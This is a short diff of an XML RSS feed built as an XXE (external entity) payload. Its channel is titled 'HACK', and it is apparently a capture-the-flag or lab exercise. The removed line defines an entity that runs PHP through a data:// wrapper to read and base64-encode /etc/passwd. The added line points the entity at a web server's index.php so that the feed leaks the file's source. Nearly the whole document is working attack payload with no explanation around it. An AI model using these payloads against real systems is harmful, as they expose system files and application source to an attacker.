@@ -1,11 +1,12 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE rss [
-  <!ENTITY xxe SYSTEM "data://text/plain,<?php echo base64_encode(file_get_contents("/etc/passwd"));"> 
+  <!ENTITY xxe SYSTEM "file:///var/www/html/index.php"> 
 ]>
 <rss version="2.0">
   <channel>
     <title>HACK</title>
     <item>
+      <title>CYBER</title>
       <description>&xxe;</description>
     </item>
   </channel>
